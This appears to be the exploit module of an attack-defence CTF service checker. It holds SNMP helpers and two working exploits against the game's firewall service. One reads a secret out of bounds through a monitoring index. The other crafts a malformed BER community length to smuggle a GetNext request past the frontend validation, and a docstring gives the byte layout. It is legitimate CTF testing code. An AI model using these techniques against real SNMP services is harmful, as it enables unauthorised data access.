import asyncio
import typing

from enochecker3.types import MumbleException
from logging import LoggerAdapter
from pyasn1.codec.ber import encoder, decoder
from pysnmp.proto import api, rfc1905

from .frontend import FrontendClient
from .types import AsyncConnection
from .vpn import VPN_MTU


Oid: typing.TypeAlias = tuple[int, ...]


class SNMPException(Exception):
    """Generic SNMP exception"""


class SNMPNotFoundException(SNMPException):
    """Object not found exception"""


class SNMPErrorStateException(SNMPException):
    """Got error state in SNMP response"""


class SNMPExploitException(SNMPException):
    """Something went wrong in exploit code."""


RETRY_COUNT = 5
RETRY_TIMEOUT = 2

TAG_INTEGER = 0x02
TAG_OCTET_STRING = 0x04
TAG_SEQUENCE = 0x30
TAG_GET_PDU = 0xA0

COMMUNITY = "firewall"
CUSTOM_OID: Oid = (1, 3, 6, 1, 4, 1, 63293, 2, 2025, 10, 1, 3)
MONITORING_OID: Oid = (1, 3, 6, 1, 4, 1, 63293, 2, 2025, 5)

p_mod = api.PROTOCOL_MODULES[api.SNMP_VERSION_2C]

# index in monitoring that will be the first value in the custon variable array
# must be the same value as N_MONITORING_VALUES in the agent code
CUSTOM_OOB_INDEX = 18
# size of each custom entry, as index for monitoring value
CUSTOM_ENTRY_SIZE = 0x78 // 8
# maxium number of custom entries, from MAX_CUSTOM_ENTRIES in agent code
CUSTOM_ENTRIES_MAX = 100000
# offsets in the custom struct in terms of monitoring value index
CUSTOM_IDENTIFIER_OFFSET = 0
CUSTOM_SECRET_OFFSET = 1


async def send_recv_data(connection: AsyncConnection, data: bytes):
    reader, writer = connection
    for i in range(RETRY_COUNT):
        writer.write(data)
        await writer.drain()
        try:
            return await asyncio.wait_for(reader.read(VPN_MTU), RETRY_TIMEOUT)
        except asyncio.TimeoutError:
            pass
    raise SNMPExploitException(f"No response from agent after {RETRY_COUNT} tries")


def snmp_encode_pdu(pdu: rfc1905.PDU, opaque_community: bool = False) -> bytes:
    msg = p_mod.Message()
    p_mod.apiMessage.set_defaults(msg)
    if opaque_community:
        # force this to opaque type
        # netsnmp doesn't care but pysnmp will not validate this
        msg.setComponentByPosition(1, p_mod.Opaque(COMMUNITY), matchTags=False)
    else:
        p_mod.apiMessage.set_community(msg, COMMUNITY)
    p_mod.apiMessage.set_pdu(msg, pdu)
    return encoder.encode(msg)


def snmp_decode_pdu(data: bytes):
    msg, data = decoder.decode(data, asn1Spec=p_mod.Message())
    return p_mod.apiMessage.get_pdu(msg)


def snmp_build_get(oid: Oid, opaque_community: bool = False) -> bytes:
    pdu = p_mod.GetRequestPDU()
    p_mod.apiPDU.set_defaults(pdu)
    p_mod.apiPDU.set_varbinds(
        pdu,
        ((oid, p_mod.Null("")),),
    )
    return snmp_encode_pdu(pdu, opaque_community)


def snmp_build_get_next(oid: Oid) -> bytes:
    pdu = p_mod.GetNextRequestPDU()
    p_mod.apiPDU.set_defaults(pdu)
    p_mod.apiPDU.set_varbinds(
        pdu,
        ((oid, p_mod.Null("")),),
    )
    return snmp_encode_pdu(pdu)


async def snmp_get(connection: AsyncConnection, oid: Oid):
    data = snmp_build_get(oid)
    data = await send_recv_data(connection, data)
    return snmp_decode_pdu(data)


async def snmp_get_next(connection: AsyncConnection, oid: Oid):
    data = snmp_build_get_next(oid)
    data = await send_recv_data(connection, data)
    return snmp_decode_pdu(data)


async def get_next_custom(connection: AsyncConnection, index: bytes):
    index_oid = p_mod.OctetString(index).asNumbers()
    oid: Oid = CUSTOM_OID + index_oid + (0,) * 8
    pdu = await snmp_get_next(connection, oid)

    errorStatus = p_mod.apiPDU.get_error_status(pdu)
    if errorStatus:
        raise SNMPException(f"Got error status: {errorStatus.prettyPrint()}")
    _oid, val = p_mod.apiPDU.get_varbinds(pdu)[0]
    if val == rfc1905.noSuchObject:
        raise SNMPNotFoundException(f"Missing object during get next: {oid}")

    return bytes(val)


async def frontend_get_monitoring(frontend_client: FrontendClient, index: int, opaque_community: bool = False) -> int:
    assert 0 <= index < 2**32
    oid: Oid = MONITORING_OID + (index,)
    data = snmp_build_get(oid, opaque_community)
    data = await frontend_client.snmp_get_raw(data)
    pdu = snmp_decode_pdu(data)

    errorStatus = p_mod.apiPDU.get_error_status(pdu)
    if errorStatus:
        raise SNMPException(f"Got error status: {errorStatus.prettyPrint()}")
    _oid, val = p_mod.apiPDU.get_varbinds(pdu)[0]
    if val == rfc1905.noSuchObject:
        raise SNMPNotFoundException(f"Missing object during get: {oid}")

    return int(val)


async def frontend_get_monitoring_raw(frontend_client: FrontendClient, index: int) -> bytes:
    value = await frontend_get_monitoring(frontend_client, index)
    return value.to_bytes(8, "little")


async def frontend_get_custom(frontend_client: FrontendClient, target_identifier: bytes, secret: bytes) -> bytes:
    """Get a custom value via the manager raw request endpoint"""
    index_oid = p_mod.OctetString(target_identifier).asNumbers()
    secret_oid = p_mod.OctetString(secret).asNumbers()
    oid: Oid = CUSTOM_OID + index_oid + secret_oid
    data = snmp_build_get(oid)
    data = await frontend_client.snmp_get_raw(data)
    pdu = snmp_decode_pdu(data)

    errorStatus = p_mod.apiPDU.get_error_status(pdu)
    if errorStatus:
        raise SNMPErrorStateException(f"Got error status: {errorStatus.prettyPrint()}")
    _oid, val = p_mod.apiPDU.get_varbinds(pdu)[0]
    if val == rfc1905.noSuchObject:
        raise SNMPNotFoundException(f"Missing object during get: {oid}")

    return bytes(val)


async def manager_oob_exploit(frontend_client: FrontendClient, target_identifier: bytes, logger: LoggerAdapter) -> str:
    def ci2mi(custom_index: int) -> int:
        """Convert a custom index to a monitoring index"""
        return CUSTOM_OOB_INDEX + CUSTOM_ENTRY_SIZE * custom_index

    secret = None
    target = int.from_bytes(target_identifier, byteorder="big", signed=False)
    left = 0
    right = CUSTOM_ENTRIES_MAX - 1
    while left <= right:
        mid = (left + right) // 2

        index = ci2mi(mid)
        identifier = await frontend_get_monitoring_raw(frontend_client, index + CUSTOM_IDENTIFIER_OFFSET)
        identifier = int.from_bytes(identifier, byteorder="big", signed=False)
        if identifier == target:
            break
        # If identifier is zero, the entry is likely unused
        if identifier != 0 and identifier < target:
            left = mid + 1
        else:
            right = mid - 1
    else:
        logger.error(f"Found no secret while scanning for identifier {target_identifier}")
        raise SNMPExploitException("Could not find checker identifier")

    try:
        secret = await frontend_get_monitoring_raw(frontend_client, index + CUSTOM_SECRET_OFFSET)
    except MumbleException:
        logger.exception(f"Failed to retrieve secret for index {index} from frontend")
        raise SNMPExploitException("Failed to retrieve secret from frontend")

    try:
        value = await frontend_client.snmp_get_var(secret, target_identifier)
    except MumbleException:
        logger.exception(f"Failed to retrieve flag value for index {index} and secret {secret} from frontend")
        raise SNMPExploitException("Failed to retrieve flag from frontend")

    return value


async def manager_getnext_exploit(
    frontend_client: FrontendClient, target_identifier: bytes, logger: LoggerAdapter
) -> bytes:
    """
    generate a SNMP message which contains a community with a crafted length

    the length is encoded in the first byte after the tag it the value is less then 0x80
    if it is larger than then value minus 0x80 defines the lenght of the following lenth field
    this also means there are multiple ways to encode the same length, e.g.:
        0x10
        0x81 0x10
    these are the same length of 0x10
    the frontend validation logic contains a bug that doesn't check the case when the length is larger than 0x80
    thus it interprets 0x81 as a length of 129 and doesn't read the value from the next byte
    use this bug to smuggle a get next request past the validation logic

    tag sequence + length:
    30 3b
    tag integer + length + version number:
    02 01 01
    tag octet string + lenlen + length + community: <- This is the modified field
    04 81 08 6669726577616c6c
    actual PDU, starting with type:
    a22b020400e7f2cd020100020100301d301b060e2b0601040183ee3d028f6905863c460900803e4edf0c3399c2

    the frontend will read 129 bytes after the community length field thus we must pad the message to the required length
    after that the frontend expects a valid pdu tlv wich we must supply with the get pdu type
    """

    def p8(n: int):
        return n.to_bytes(1)

    # generate a valid getnext message
    index_oid = p_mod.OctetString(target_identifier).asNumbers()
    oid: Oid = CUSTOM_OID + index_oid + (0,) * 8
    message = snmp_build_get_next(oid)

    # cut the pdu out of the message
    pdu = message[15:]

    # build the header
    version = p8(TAG_INTEGER) + p8(1) + p8(1)
    community = COMMUNITY.encode()
    # build the community with a malicious size field
    community = p8(TAG_OCTET_STRING) + p8(0x81) + p8(len(community)) + community

    # build the message
    content = version + community + pdu
    assert len(content) < 128
    message = p8(TAG_SEQUENCE) + p8(len(content)) + content

    # netsnmp will just drop the garbage after the end of message
    # thus we don't need to consider anything while padding the message
    # message tag + message length + version tlv + community tag + community length + expected length
    message = message.ljust(2 + len(version) + 2 + 129, b"\x00")
    message += p8(TAG_GET_PDU)  # pdu type to pass check
    message += p8(1)  # length field to pass validation

    try:
        data = await frontend_client.snmp_get_raw(message)
    except MumbleException:
        logger.exception(f"failed to call getnext on custom value for identifier {target_identifier}")

    pdu = snmp_decode_pdu(data)

    errorStatus = p_mod.apiPDU.get_error_status(pdu)
    if errorStatus:
        raise SNMPException(f"Got error status: {errorStatus.prettyPrint()}")
    _oid, val = p_mod.apiPDU.get_varbinds(pdu)[0]
    if val == rfc1905.noSuchObject:
        raise SNMPNotFoundException(f"Missing object during get next: {oid}")

    return bytes(val)
